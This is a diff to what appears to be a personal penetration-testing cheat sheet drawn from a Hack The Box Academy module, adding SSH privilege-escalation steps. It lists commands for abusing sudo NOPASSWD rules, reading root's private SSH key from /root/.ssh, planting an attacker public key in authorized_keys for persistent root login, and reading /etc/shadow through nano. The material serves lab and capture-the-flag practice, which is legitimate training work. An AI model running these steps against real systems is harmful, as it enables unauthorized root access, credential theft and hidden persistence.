@@ -294,6 +294,52 @@ On Attacker
 >./nano -p /etc/shadow
 ```
 
+# Escalate Privileges via SSH
+```
+>ssh {user}@{targetIP}
+Password from shoulder surfing, previous challenege, or hydra
+>whoami
+>sudo -l (look for NOPASSWD
+>sudo -u {user2} {command} (e.g. >sudo -u user2 /bin/bash)
+>whoami
+>cat flag file
+
+Vertical (maybe after horizontal):
+>cd /root
+>ls -la
+>cd .ssh
+>ls
+>cat id_rsa
+Copy private key
+Paste to local machine id_rsa
+>chmod 600 id_rsa
+>ssh root@{targetIP} -i id_rsa
+If permission denied, try to specify port
+>ssh root@{targetIP} -p {port} -i id_rsa
+>whoami
+
+OR
+>ssh {user}@{targetIP}
+>sudo -u user2 /bin/bash
+>cd /root
+>cd .ssh
+>cat authorised_keys
+On local >ssh-keygen -f key
+Copy public key to authorised keys
+(Through ssh session) >echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
+(on local) >ssh root@10.10.10.10 -i key
+
+```
+Ref https://academy.hackthebox.com/module/77/section/844
+
+# Escalate Privileges (advanced)
+```
+>ssh {user}@{targetIP}
+>ls
+>stat -c "%a %A %U %G %F" {filename}
+
+```
+
 # Covert Communication
 ```
 Download and compile  on both systems:
